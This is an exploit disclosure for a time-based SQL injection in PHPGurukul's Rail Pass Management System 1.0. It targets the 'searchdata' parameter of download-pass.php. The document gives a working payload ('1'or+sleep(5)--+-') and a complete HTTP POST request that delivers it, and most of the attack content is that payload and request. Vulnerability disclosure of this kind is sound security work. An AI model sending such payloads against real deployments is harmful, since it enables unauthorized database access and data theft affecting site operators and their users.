# Rail Pass Management System - 'searchdata' Time-Based SQL Injection
- Exploit Author: Alperen Yozgat
- Vendor Homepage: https://phpgurukul.com/rail-pass-management-system-using-php-and-mysql/
- Software Link: https://phpgurukul.com/?sdm_process_download=1&download_id=17479
- Version: 1.0
- Tested On: Kali Linux 6.1.27-1kali1 (2023-05-12) x86_64 + XAMPP 7.4.30

## Description
On the download-pass.php page, the searchdata parameter in the search function is vulnerable to SQL injection vulnerability.
## Proof of Concept
After sending the payload, the response time will increase to at least 5 seconds.
Payload: 1'or+sleep(5)--+-

## HTTP Request
```
POST /rpms/download-pass.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Cookie: PHPSESSID=6028f950766b973640e0ff64485f727b


searchdata=1'or+sleep(5)--+-&search=
```
